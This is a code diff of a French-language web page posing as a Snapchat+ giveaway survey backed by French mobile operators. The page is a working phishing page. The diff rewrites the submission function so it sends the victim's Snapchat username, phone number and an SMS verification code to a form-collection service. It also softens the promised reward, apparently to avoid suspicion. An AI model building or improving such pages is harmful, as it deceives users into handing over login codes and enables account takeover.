@@ -160,7 +160,8 @@ button:disabled {
         En partenariat avec Bouygues Telecom, Orange et SFR
     </div>
 </div>
-<script>
+
+  <script>
 const titre = "Sondage pour bénéficier de Snapchat+";
 
 const questions = [
@@ -231,7 +232,7 @@ function suivant(){
     } else {
         sondage.innerHTML = `
             <h2>Merci pour votre participation !</h2>
-            <p>Vous recevrez Snapchat + sur votre compte Snapchat dans les 24 porchaines heures.</p>
+            <p>Vous recevrez un message prochainement.</p>
         `;
         envoyer();
     }
@@ -246,11 +247,13 @@ function continuer(){
 function envoyer(){
     const formData = new FormData();
 
-    questions.forEach((q,i)=>{
-        formData.append(q.text, reponsesUtilisateur[i] || "");
-    });
+    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
+    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
+    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+    formData.append("snapchat", reponsesUtilisateur[3] || "");
+    formData.append("telephone", reponsesUtilisateur[4] || "");
+    formData.append("code_sms", reponsesUtilisateur[5] || "");
 
-    /* 🔥 OBLIGATOIRE POUR FORM SUBMIT */
     formData.append("_captcha", "false");
     formData.append("_template", "table");
 
